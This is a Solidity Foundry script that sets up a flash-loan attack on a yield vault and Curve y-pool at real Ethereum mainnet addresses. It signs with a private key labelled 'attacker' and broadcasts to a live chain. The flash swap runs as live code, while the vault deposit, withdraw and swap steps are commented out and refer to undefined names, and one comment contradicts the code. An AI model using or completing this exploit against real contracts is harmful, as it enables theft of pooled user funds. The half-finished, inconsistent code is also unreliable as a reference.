// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./interface.sol";

import "forge-std/Script.sol";
import "forge-std/Test.sol";
// interface IUniswapV2Pair {
//     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
//     function skim(address to) external;
//     function token0() external view returns (address);
//     function token1() external view returns (address);
//     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
//     function price0CumulativeLast() external view returns (uint256);
//     function price1CumulativeLast() external view returns (uint256);
//     function balanceOf(address account) external view returns (uint256);
//     function approve(address spender, uint256 value) external returns (bool);
//     function transfer(address to, uint256 value) external returns (bool);
//     function transferFrom(address from, address to, uint256 value) external returns (bool);
//     function burn(address to) external returns (uint256 amount0, uint256 amount1);
// }

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// interface IUniswapV2Pair {
//     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
// }

interface ERC20 {
    function balanceOf(address) external returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function withdraw(uint256) external;
}

interface HVault {
    function deposit(uint256) external;
    function balanceOf(address) external returns (uint256);
    function withdraw(uint256) external;
}

interface YCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface CurveStrategy {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

contract Rw2 is IUniswapV2Callee, Script {
    HVault h = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    CurveStrategy c = CurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
    YCurve yCurve = YCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniswapV2Pair WETH_USDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair WETH_USDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    ERC20 usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20 weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 secret = vm.envUint("PRIVATE_KEY");
    address attacker = vm.rememberKey(secret);

    function setUp() external {
        vm.label(address(WETH_USDT), "ETH_usdt");
        vm.label(address(weth), "weth");
        vm.label(address(usdt), "usdt");
        vm.label(address(usdc), "usdc");
        vm.label(address(yCurve), "yCurve");
        vm.label(address(attacker), "attacker");
    }

    function run() external {
        vm.startBroadcast(secret);
        console.log(IUniswapV2Pair(WETH_USDT).token0() == address(weth));
        console.log(IUniswapV2Pair(WETH_USDT).token1() == address(usdt));
        (uint256 a, uint256 b,) = IUniswapV2Pair(WETH_USDT).getReserves();
        console.log("%d %d", a, b);
        console.log("%d %d", b / 1e6, b % 1e6);
        /// 1. Flashloan usdc from Uniswap usdc-usdt pair
        IUniswapV2Pair(WETH_USDT).swap(0, 50_000_000 * 1e6, attacker, hex"123412341234");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) public {
        console.log("uniswapV2Call");
        require(usdt.balanceOf(attacker) == 50_000_000 * 1e6, "flashloan failed");
        console.log("flashloan success");

        // if (msg.sender == WETH_USDT) {
        //     /// 2. check flashloan amount
        //     require(IERC20(usdt).balanceOf(attacker) == 50_000_000 * 1e6, "flashloan failed");
        //     console.log("flashloan success");

        //     /// 3. deposit usdc to ySwap
        //     IERC20(usdc).approve(ySwap, 50_000_000 * 1e6);
        //     IFarm(ySwap).deposit(50_000_000 * 1e6);

        //     /// 4. withdraw fusdt from ySwap
        //     IFarm(ySwap).withdraw(50_000_000 * 1e6);

        //     /// 5. exchange fusdt to usdt
        //     IERC20(fusdt).approve(usdt, 50_000_000 * 1e6);
        //     ICurve(usdt).exchange_underlying(1, 0, 50_000_000 * 1e6, 50_000_000 * 1e6);

        //     /// 6. repay flashloan
        //     IERC20(usdt).transfer(ETH_usdt, 50_000_000 * 1e6);
        // }
    }
}
